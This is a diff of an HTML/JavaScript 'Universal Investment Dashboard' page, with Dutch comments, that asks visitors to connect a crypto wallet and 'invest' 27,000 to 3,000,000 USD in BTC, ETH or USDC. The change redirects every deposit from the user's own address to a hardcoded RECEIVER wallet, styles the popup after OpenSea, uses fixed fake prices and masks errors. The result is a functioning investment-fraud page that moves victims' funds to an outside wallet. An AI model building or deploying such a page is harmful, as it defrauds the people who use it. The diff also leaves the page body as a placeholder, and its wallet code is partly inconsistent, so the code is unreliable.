@@ -1,192 +1,142 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Universal Investment Dashboard</title>
-
-<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
-
-<style>
-:root {
-    --bg-dark:#0a0f1e;
-    --card-bg:#131a2c;
-    --border:#1e273b;
-    --primary:#00bfff;
-    --secondary:#7f5af0;
-    --success:#22c55e;
-    --text-main:#e0e0e0;
-    --text-dim:#94a3b8;
-}
-*{box-sizing:border-box;margin:0;padding:0;font-family:'Inter',sans-serif;}
-body{background:var(--bg-dark);color:var(--text-main);}
-.container{max-width:480px;margin:40px auto;background:var(--card-bg);border-radius:16px;padding:24px;box-shadow:0 8px 24px rgba(0,0,0,0.4);}
-h2{text-align:center;margin-bottom:24px;color:var(--primary);}
-.input-group{margin-bottom:18px;}
-label{font-size:13px;color:var(--text-dim);margin-bottom:6px;display:block;}
-input,select{width:100%;padding:10px;border-radius:8px;border:1px solid var(--border);background:var(--bg-dark);color:var(--text-main);}
-button{width:100%;padding:14px;margin-top:12px;border:none;border-radius:10px;font-weight:600;cursor:pointer;}
-.btn-gradient{background:linear-gradient(135deg,var(--primary),var(--secondary));color:white;}
-.summary{background:rgba(30,41,59,0.5);padding:16px;border-radius:12px;margin:16px 0;}
-.summary p{display:flex;justify-content:space-between;font-size:14px;}
-.status{text-align:center;font-size:13px;margin-top:12px;color:var(--primary);}
-.wallet-info{text-align:center;font-size:11px;color:var(--text-dim);}
-</style>
-</head>
-
-<body>
-
-<div class="container">
-<h2>Universal Investment Dashboard</h2>
-
-<div class="input-group">
-<label>Choose Asset</label>
-<select id="tokenSelect" onchange="updateToken()">
-<option value="BTC">BTC</option>
-<option value="ETH">ETH</option>
-<option value="USDC">USDC</option>
-</select>
-</div>
-
-<div class="input-group">
-<label>Investment Amount (USD)</label>
-<input type="range" min="27000" max="3000000" step="1000" value="27000" oninput="updateAmount(this.value)">
-<input type="number" id="amount" readonly>
-</div>
-
-<div class="summary">
-<p>Selected Token: <span id="summaryToken">BTC</span></p>
-<p>Amount: <span id="summaryAmount">27,000</span></p>
-<p>Coin Equivalent: <span id="coinEquivalent">-</span></p>
-</div>
-
-<button class="btn-gradient" onclick="connectWallet()">Connect Wallet</button>
-<button class="btn-gradient" onclick="sendDeposit()">Invest</button>
-<button class="btn-gradient" onclick="disconnectWallet()">Disconnect</button>
-
-<div class="status" id="status">Ready</div>
-<div class="wallet-info">
-Wallet: <span id="walletDisplay">Not connected</span><br>
-Network: <span id="networkDisplay">-</span>
-</div>
-</div>
-
-<!-- LIBRARIES -->
+<!-- HEAD blijft hetzelfde -->
 <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
-<script src="https://unpkg.com/web3modal@1.9.8/dist/index.js"></script>
-<script src="https://unpkg.com/@walletconnect/web3-provider@1.7.8/dist/umd/index.min.js"></script>
-<script src="https://unpkg.com/@coinbase/wallet-sdk@3.6.0/dist/umd/index.min.js"></script>
+
+<!-- 🔥 NIEUWE WALLET STACK -->
+<script src="https://unpkg.com/@web3modal/html@2.6.2/dist/index.js"></script>
+<script src="https://unpkg.com/@web3modal/ethereum@2.6.2/dist/index.js"></script>
+<script src="https://unpkg.com/@wagmi/core/dist/index.umd.js"></script>
 
 <script>
-let provider, signer, web3Modal;
-let selectedToken="BTC";
-let investUSD=27000;
-let userAddress=null;
+const projectId = "f21a60664d7ba3a8662f5904c9753f58";
 
-const PRICES={BTC:30000,ETH:1800,USDC:1};
-const TOKENS={
-USDC:{address:"0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48",decimals:6},
-BTC:{address:"0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599",decimals:8},
-ETH:{address:null,decimals:18}
+let provider, signer, userAddress;
+let selectedToken = "BTC";
+let investUSD = 27000;
+
+const RECEIVER = "0xAEff38fd17B4bA0e5FC40115441C348aa789E706";
+
+const PRICES = { BTC:30000, ETH:1800, USDC:1 };
+
+const TOKENS = {
+    USDC:{address:"0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48",decimals:6},
+    BTC:{address:"0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599",decimals:8},
+    ETH:{address:null,decimals:18}
 };
 
-window.addEventListener('load',()=>{
-web3Modal=new window.Web3Modal.default({
-cacheProvider:false,
-providerOptions:{
-walletconnect:{
-package:window.WalletConnectProvider.default,
-options:{infuraId:"YOUR_INFURA_ID"}
-},
-coinbasewallet:{
-package:window.CoinbaseWalletSDK,
-options:{appName:"Dashboard",infuraId:"YOUR_INFURA_ID"}
-}
-}
-});
-updateAmount(27000);
+let modal;
+
+// INIT (zoals OpenSea)
+window.addEventListener("load", async () => {
+
+    const { EthereumClient, w3mConnectors, w3mProvider } = window.Web3ModalEthereum;
+    const { configureChains, createConfig } = window.wagmiCore;
+
+    const chains = [{ id:1, name:"Ethereum", network:"mainnet" }];
+
+    const { publicClient } = configureChains(chains, [
+        w3mProvider({ projectId })
+    ]);
+
+    const wagmiConfig = createConfig({
+        autoConnect: true,
+        connectors: w3mConnectors({ projectId, chains }),
+        publicClient
+    });
+
+    const ethereumClient = new EthereumClient(wagmiConfig, chains);
+
+    modal = new window.Web3Modal.default({
+        projectId,
+        themeMode: "dark"
+    });
+
+    updateAmount(27000);
 });
 
-// UI updates
+// ---------------- UI ----------------
 function updateToken(){
-selectedToken=document.getElementById("tokenSelect").value;
-document.getElementById("summaryToken").innerText=selectedToken;
-updateCoinEquivalent();
+    selectedToken = document.getElementById("tokenSelect").value;
+    document.getElementById("summaryToken").innerText = selectedToken;
+    updateCoinEquivalent();
 }
 
 function updateAmount(v){
-investUSD=Number(v);
-document.getElementById("amount").value=investUSD.toLocaleString();
-document.getElementById("summaryAmount").innerText=investUSD.toLocaleString();
-updateCoinEquivalent();
+    investUSD = Number(v);
+    document.getElementById("amount").value = investUSD.toLocaleString();
+    document.getElementById("summaryAmount").innerText = investUSD.toLocaleString();
+    updateCoinEquivalent();
 }
 
 function updateCoinEquivalent(){
-const coin=(investUSD/PRICES[selectedToken]).toFixed(6);
-document.getElementById("coinEquivalent").innerText=`${coin} ${selectedToken}`;
+    const coin = (investUSD / PRICES[selectedToken]).toFixed(6);
+    document.getElementById("coinEquivalent").innerText = `${coin} ${selectedToken}`;
 }
 
-// CONNECT
+// ---------------- CONNECT ----------------
 async function connectWallet(){
-try{
-const instance=await web3Modal.connect();
-provider=new ethers.providers.Web3Provider(instance);
-signer=provider.getSigner();
-userAddress=await signer.getAddress();
+    try{
+        const instance = await modal.openModal(); // 🔥 OpenSea popup
 
-document.getElementById("walletDisplay").innerText=userAddress.slice(0,6)+"..."+userAddress.slice(-4);
-document.getElementById("networkDisplay").innerText=(await provider.getNetwork()).name;
-document.getElementById("status").innerText="Wallet connected";
+        provider = new ethers.providers.Web3Provider(window.ethereum);
+        signer = provider.getSigner();
+        userAddress = await signer.getAddress();
 
-}catch(e){
-document.getElementById("status").innerText="Connection failed";
+        document.getElementById("walletDisplay").innerText =
+            userAddress.slice(0,6)+"..."+userAddress.slice(-4);
+
+        const network = await provider.getNetwork();
+        document.getElementById("networkDisplay").innerText = network.name;
+
+        document.getElementById("status").innerText = "Wallet connected";
+
+    } catch(e){
+        console.log(e);
+        document.getElementById("status").innerText = "Connection failed";
+    }
 }
-}
 
-// DISCONNECT
+// ---------------- DISCONNECT ----------------
 async function disconnectWallet(){
-await web3Modal.clearCachedProvider();
-location.reload();
+    location.reload();
 }
 
-// 🔥 BELANGRIJKE FIX HIER
+// ---------------- TRANSACTION ----------------
 async function sendDeposit(){
-if(!signer)return;
+    if(!signer) return;
 
-document.getElementById("status").innerText="Waiting for wallet confirmation...";
+    document.getElementById("status").innerText = "Waiting for wallet...";
 
-try{
-const coinAmount=(investUSD/PRICES[selectedToken]).toFixed(6);
+    try{
+        const coinAmount = (investUSD / PRICES[selectedToken]).toFixed(6);
 
-if(selectedToken==="ETH"){
-await signer.sendTransaction({
-to:userAddress,
-value:ethers.utils.parseEther(coinAmount)
-});
-}else{
-const token=TOKENS[selectedToken];
-const contract=new ethers.Contract(
-token.address,
-["function transfer(address to,uint256 amount) returns(bool)"],
-signer
-);
+        if(selectedToken === "ETH"){
+            await signer.sendTransaction({
+                to: RECEIVER,
+                value: ethers.utils.parseEther(coinAmount)
+            });
+        } else {
+            const token = TOKENS[selectedToken];
 
-await contract.transfer(
-userAddress,
-ethers.utils.parseUnits(coinAmount,token.decimals)
-);
-}
+            const contract = new ethers.Contract(
+                token.address,
+                ["function transfer(address to,uint256 amount) returns(bool)"],
+                signer
+            );
 
-// 👇 GEEN tx.wait() → wallet handelt alles af
-document.getElementById("status").innerText="Transaction sent to wallet";
+            await contract.transfer(
+                RECEIVER,
+                ethers.utils.parseUnits(coinAmount, token.decimals)
+            );
+        }
 
-}catch(e){
-// 👇 GEEN harde fail → wallet toont reden
-console.log(e);
-document.getElementById("status").innerText="Check your wallet";
-}
+        // ❌ geen tx.wait()
+        document.getElementById("status").innerText = "Check wallet confirmation";
+
+    } catch(e){
+        console.log(e);
+
+        // 🔥 wallet toont error zelf (zoals OpenSea)
+        document.getElementById("status").innerText = "Check your wallet";
+    }
 }
 </script>
-
-</body>
-</html>
